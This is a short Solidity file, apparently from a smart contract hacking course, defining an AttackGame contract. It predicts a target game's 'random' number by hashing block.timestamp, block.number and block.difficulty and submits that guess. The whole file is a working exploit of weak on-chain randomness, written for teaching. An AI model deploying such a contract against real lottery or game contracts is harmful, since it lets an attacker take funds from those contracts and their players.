// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

interface IGame {
    function play(uint guess) external;
}

contract AttackGame {

    IGame public game;

    constructor(address gameContract) payable {
        game = IGame(gameContract);
    }

    function attack() external payable {
        uint number = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        game.play(number);
    }
    
    receive() external payable {}

}